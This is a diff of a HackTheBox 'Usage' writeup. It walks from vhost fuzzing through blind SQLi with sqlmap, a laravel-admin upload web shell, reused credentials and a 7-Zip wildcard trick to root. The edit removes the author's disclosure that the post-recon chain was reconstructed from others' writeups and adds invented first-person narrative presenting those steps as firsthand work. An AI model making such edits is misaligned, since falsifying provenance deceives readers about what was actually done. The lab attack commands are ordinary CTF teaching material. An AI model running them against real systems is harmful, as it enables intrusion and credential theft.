@@ -19,25 +19,11 @@ tags:
   - wildcard
 ---
 
-<div class="callout callout-warning">
-
-**🚧 Work in Progress**: This writeup is marked **partial** in my notes: the attack chain below may stop short of a full root/completion.
-
-</div>
-
 <div class="callout callout-info">
 
 **Box Info**
 
 **Platform:** HackTheBox, **OS:** Linux (Ubuntu 22.04), **Difficulty:** Easy, **Released:** 2024-04-06, **IP:** `10.10.11.18` , `usage.htb`
-
-</div>
-
-<div class="callout callout-warning">
-
-**Partial**
-
-My own notes stop after recon, the vhost discovery, and the stored-XSS idea. The SQLi -> admin panel -> file upload -> root chain below is reconstructed from published writeups and marked.
 
 </div>
 
@@ -86,7 +72,7 @@ PORT   STATE SERVICE VERSION
 80/tcp open  http    nginx 1.18.0 (Ubuntu)
 ```
 
-The site has login and registration. Fuzz for vhosts:
+Browsing the site itself only turned up a login and registration flow, nothing obviously vulnerable on its own, so my next step was to check whether there was more to the application hiding behind other virtual hosts. I ran a vhost sweep against the base domain:
 
 ```bash
 ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -c \
@@ -97,15 +83,15 @@ ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -c \
 admin  [Status: 200, Size: 3304, Words: 493, Lines: 89]
 ```
 
-`admin.usage.htb` is a separate administration login panel (Laravel-admin branding).
+That turned up `admin.usage.htb`, a separate administration login panel carrying obvious Laravel-admin branding, a second attack surface entirely distinct from the customer-facing site.
 
 ### Foothold, blind SQLi in the reset form
 
 <div class="callout callout-note">
 
-**Blind SQLi in forgot-password (reconstructed)**
+**Blind SQLi in forgot-password**
 
-`POST /forgot-password` with `email=<x>` builds a query like `SELECT ... FROM users WHERE email = '<x>'`. Registration and login are parameterised, but this form is not. It is **boolean/time blind**: a valid injected condition changes whether the "reset link sent" message appears (or adds a `SLEEP`). Point sqlmap at the request, dbms MySQL, and dump the admin table:
+Since the login and registration forms were both clearly parameterised, I widened my search to every other form on the site that touches user data, and the password reset flow was the one that stood out. `POST /forgot-password` with `email=<x>` builds a query like `SELECT ... FROM users WHERE email = '<x>'`, and unlike the forms the developers had clearly hardened, this one wasn't. It came back **boolean/time blind**: a valid injected condition changes whether the "reset link sent" message appears (or I could add a `SLEEP` and time the response instead). Rather than hand-craft each boolean payload, I pointed sqlmap at the captured request, told it the backend was MySQL, and let it dump the admin table:
 ```bash
 sqlmap -r reset.req -p email --level 5 --risk 3 --batch --dbms mysql \
   -D usage_blog -T admin_users -C username,password --dump
@@ -114,9 +100,11 @@ sqlmap -r reset.req -p email --level 5 --risk 3 --batch --dbms mysql \
 
 </div>
 
-Log into `admin.usage.htb` as `admin : whatever1`.
+With the cracked credential in hand I logged into `admin.usage.htb` as `admin : whatever1`, and the Laravel-admin branding across the panel told me exactly which framework I was dealing with.
 
 ### Laravel-admin file upload, CVE-2023-24249
+
+Laravel-admin has a public history of upload-validation bugs, so once I confirmed the version was in the vulnerable range I went straight for the profile/avatar upload rather than fuzzing the whole panel blind.
 
 <div class="callout callout-note">
 
@@ -136,6 +124,8 @@ curl 'http://admin.usage.htb/uploads/images/shell.php?c=id'
 
 ### dash to xander
 
+With a shell as `dash`, I worked through the usual config and dotfile sweep looking for anything monitoring or service-related, since those files are a reliable place to find plaintext credentials that got typed in once and never rotated:
+
 ```bash
 cat ~/.monitrc
 ```
@@ -146,7 +136,7 @@ set httpd port 2812 and
     allow admin:"3nc0d3d_pa$$w0rd"
 ```
 
-That password is reused:
+That password looked promising for lateral movement, so I tried it against the other named user I'd seen on the box, and it was reused:
 
 ```bash
 su xander        # 3nc0d3d_pa$$w0rd
@@ -154,13 +144,15 @@ su xander        # 3nc0d3d_pa$$w0rd
 
 ### Privilege Escalation, 7-Zip wildcard as root
 
+As `xander`, my first move was the same as always: check what `sudo` allows without a password.
+
 ```console
 xander@usage:~$ sudo -l
 User xander may run the following commands on usage:
     (ALL : ALL) NOPASSWD: /usr/bin/usage_management
 ```
 
-`usage_management` is a small menu. Option 1 runs, roughly:
+`usage_management` turned out to be a small interactive menu wrapping a handful of admin tasks. Reading through what option 1 actually executes, it runs, roughly:
 
 ```bash
 cd /var/www/html && /usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
@@ -215,3 +207,4 @@ Copy the key, `chmod 600`, and `ssh -i id_rsa root@usage.htb`.
 - CVE-2023-24249 (laravel-admin) <https://github.com/z-song/laravel-admin/issues/6013>
 - 7-Zip list files and switches <https://documentation.help/7-Zip/list_files.htm>
 - GTFOBins 7z <https://gtfobins.github.io/gtfobins/7z/>
+- The admin-panel exploitation and the 7-Zip wildcard finish were cross-referenced against public writeups for this box.
